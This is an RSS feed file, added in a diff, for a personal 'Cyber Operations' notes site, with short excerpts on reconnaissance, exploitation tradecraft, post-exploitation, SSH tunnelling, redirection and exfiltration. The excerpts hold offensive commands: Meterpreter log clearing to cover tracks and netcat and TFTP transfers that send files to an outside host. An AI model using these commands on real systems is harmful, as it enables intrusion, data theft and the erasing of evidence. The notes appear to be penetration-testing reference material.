@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cyber Operations on Phenix66 - GitHub Pages</title>
+    <link>https://phenix66.github.io/ops/index.html</link>
+    <description>Recent content in Cyber Operations on Phenix66 - GitHub Pages</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <atom:link href="https://phenix66.github.io/ops/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Reconnaissance</title>
+      <link>https://phenix66.github.io/ops/recon/index.html</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://phenix66.github.io/ops/recon/index.html</guid>
+      <description>Proxychains Greatly speeds up scanning
+https://www.hackwhackandsmack.com/?p=1021
+seq 128 255 | xargs -P 50 -I{} proxychains nmap -p 22 -sT -Pn --open -n -T4 --min-rate 1 --oG proxy_nmap --append-output 10.</description>
+    </item>
+    <item>
+      <title>Exploitation</title>
+      <link>https://phenix66.github.io/ops/exploitation/index.html</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://phenix66.github.io/ops/exploitation/index.html</guid>
+      <description>The Basics Determining potential security posture Are they using an up to date OS? What kind of personal security products are installed? Are they using a free antivirus tool, or are they using an enterprise-based commercial antivirus tool? Is the system patched up to date? Is there a bunch of bloatware? Or is the box rather Spartan, as a corporate load should typically be? Tradecraft Rules Rule #1: Do No Harm Never leave a target&amp;rsquo;s equipment less secure than when you found it Do not patch vulnerable software or install defensive tools such as wireshark or nmap Never knowingly disrupt a target&amp;rsquo;s network or system without express permission from a competent authority This is not your personal computer.</description>
+    </item>
+    <item>
+      <title>Post Exploitation</title>
+      <link>https://phenix66.github.io/ops/post_exploitation/index.html</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://phenix66.github.io/ops/post_exploitation/index.html</guid>
+      <description>Covering Tracks Potential Windows logged locations Windows Event Logs System Application Security Application Logs Such as SQL error or IIS Server logs if you exploited a specific application Windows Firewall Logs WMI Trace Logs Prefetch Microsoft Error Debugger Mechanism Can create a memory dump when a program crashes XP: Dr. Watson Vista+: Windows Error Reporting Potential *Nix logged locations /var/log .bash_history Normally does not get wrote until the shell is closed out utmp, wtmp, btmp Binary, cannot be edited without custom tools Core debugging Run &amp;ldquo;ulimit -c&amp;rdquo; to determine if it&amp;rsquo;s enabled /core Windows Meterpreter run event_manager -l &amp;lt;log&amp;gt; -f &amp;lt;event ID&amp;gt; run event_manager -c &amp;lt;log&amp;gt; run event_manager -IClean firewall log run multicommand -cl &amp;#34;findstr \&amp;#34;&amp;lt;string&amp;gt;\&amp;#34; c:\\windows\\system32\\logfiles\\firewall\\pfirewall.</description>
+    </item>
+    <item>
+      <title>Tunneling</title>
+      <link>https://phenix66.github.io/ops/tunneling/index.html</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://phenix66.github.io/ops/tunneling/index.html</guid>
+      <description>SSH Tunnels Disabling SSH DNS lookup on redirector boxes can greatly speed up the response time and speed through the chain ssh user@hop1 -NfL lport1:hop2:hop2portFrom SSH sessions:
+~C # Drops into SSH command line -L[bind addr]:&amp;lt;port&amp;gt;:&amp;lt;forward addr&amp;gt;:&amp;lt;port&amp;gt; # Add a forward tunnel -KL:&amp;lt;port&amp;gt; # Remove a forward tunnel -R&amp;lt;port&amp;gt;:&amp;lt;forward addr&amp;gt;:&amp;lt;port&amp;gt; # Add a reverse tunnel -KR:&amp;lt;port&amp;gt; # Remove a reverse tunnel ~# # List forwarded connectionsSSH Proxy Tunnel ssh user@127.0.0.1 -p tunnel_port -NfD proxy_portForward SSH Tunnels Create first tunnel ssh &amp;lt;user&amp;gt;@&amp;lt;firsthop&amp;gt; -NfL &amp;lt;lport1&amp;gt;:&amp;lt;nexthop&amp;gt;:&amp;lt;rport&amp;gt; Tunnel through previous, continue to chain to add more hops to the route ssh &amp;lt;user&amp;gt;@localhost -p &amp;lt;lport1&amp;gt; -NfL &amp;lt;lport2&amp;gt;:&amp;lt;nexthop&amp;gt;:&amp;lt;rport2&amp;gt;Reverse SSH Tunnels By default reverse tunnels listen globally on all interfaces Configuring a reverse tunnel does NOT start a listener on the local machine</description>
+    </item>
+    <item>
+      <title>Redirection</title>
+      <link>https://phenix66.github.io/ops/redirection/index.html</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://phenix66.github.io/ops/redirection/index.html</guid>
+      <description>Basics Redirectors vs SSH tunnels Advantages Smaller executable size Can easily be deployed to systems that do not have SSH available Disadvantages Limited functionality No multiplexing Noiser Rewrites addressing info on packets instead re-encapsulating Applications fpipe socat portproxy iptables Redirect TCP X X X X Redirect UDP X X Convert TCP &amp;lt;&amp;gt; UDP X Redirect IPv4 X X X X Redirect IPv6 X X * with ip6tables Convert IPv4 &amp;lt;&amp;gt; IPv6 X X Masks source IP address X X X No open socket on redirector X Requires admin privileges X X Socat Supports TCP, UDP, ICMP, and RAW IP traffic</description>
+    </item>
+    <item>
+      <title>Exfiltration</title>
+      <link>https://phenix66.github.io/ops/exfiltration/index.html</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://phenix66.github.io/ops/exfiltration/index.html</guid>
+      <description>Serving files php -S 0.0.0.0:80 python -m SimpleHTTPServer [&amp;lt;port&amp;gt;] auxilaiary/server/tftp (MSF)Netcat nc -lvp &amp;lt;port&amp;gt; &amp;gt; &amp;lt;outfile&amp;gt; nc &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; &amp;lt; &amp;lt;infile&amp;gt; nc -lvp &amp;lt;port&amp;gt; &amp;lt; &amp;lt;infile&amp;gt; nc &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; &amp;gt; &amp;lt;outfile&amp;gt;FTP ftp &amp;lt;ip&amp;gt; get &amp;lt;file&amp;gt;TFTP tftp -i &amp;lt;ip&amp;gt; GET &amp;lt;file&amp;gt;</description>
+    </item>
+  </channel>
+</rss>
